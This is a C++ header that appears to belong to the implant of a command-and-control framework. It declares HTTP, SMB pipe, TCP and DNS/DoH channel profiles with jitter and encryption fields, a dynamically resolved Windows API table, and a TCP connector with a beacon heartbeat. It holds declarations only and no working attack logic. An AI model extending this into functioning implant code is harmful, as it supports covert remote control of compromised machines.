#pragma once

#include <windows.h>
#include "Connector.h"

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT
typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;

#define DNS_MODE_UDP           0
#define DNS_MODE_DOH           1
#define DNS_MODE_UDP_FALLBACK  2
#define DNS_MODE_DOH_FALLBACK  3

typedef struct {
	BYTE* domain;
	BYTE* resolvers;
	BYTE* doh_resolvers;
	BYTE* qtype;
	ULONG pkt_size;
	ULONG label_size;
	ULONG ttl;
	BYTE* encrypt_key;
	ULONG burst_enabled;
	ULONG burst_sleep;
	ULONG burst_jitter;
	ULONG dns_mode;
	BYTE* user_agent;
} ProfileDNS;
#endif

#define DECL_API(x) decltype(x) * x

struct TCPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);
	DECL_API(GetTickCount);

	//ws2_32
	DECL_API(WSAStartup);
	DECL_API(WSACleanup);
	DECL_API(socket);
	DECL_API(ioctlsocket);
	DECL_API(WSAGetLastError);
	DECL_API(closesocket);
	DECL_API(select);
	DECL_API(__WSAFDIsSet);
	DECL_API(shutdown);
	DECL_API(recv);
	DECL_API(send);
	DECL_API(accept);
	DECL_API(listen);
	DECL_API(bind);
};

typedef struct _ConnectorTCPData {
	WORD  port;
	BYTE* prepend;

	BYTE* recvData;
	int   recvSize;
	ULONG allocaSize;

	TCPFUNC* functions;

	SOCKET SrvSocket;
	SOCKET ClientSocket;

	BYTE* beat;
	ULONG beatSize;
	BOOL  connected;
} ConnectorTCPData;

Connector* CreateConnectorTCP();